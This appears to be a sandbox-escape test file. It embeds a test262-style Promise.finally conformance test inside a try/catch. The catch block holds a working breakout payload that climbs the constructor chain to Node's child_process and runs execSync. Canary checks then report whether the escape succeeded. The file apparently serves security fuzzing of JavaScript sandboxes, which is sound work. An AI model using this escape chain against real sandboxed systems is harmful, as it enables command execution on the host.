try {
    class MyPromise extends Promise {
    }
    var mp1Value = {};
    var mp1 = MyPromise.resolve(mp1Value);
    var mp2 = MyPromise.resolve(42);
    var thenCalls = [];
    var then = Promise.prototype.then;
    Promise.prototype.then = function (resolve, reject) {
        thenCalls.push({
            promise: this,
            resolve,
            reject
        });
        return then.call(this, resolve, reject);
    };
    mp1.finally(() => mp2).then(() => {
        assert.sameValue(thenCalls.length, 5);
        var mp2Calls = thenCalls.filter(c => c.promise === mp2);
        assert.sameValue(mp2Calls.length, 1);
        assert.sameValue(mp2Calls[0].reject, undefined);
        assert.sameValue(mp2Calls[0].resolve(), mp1Value);
    }).then($DONE, $DONE);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}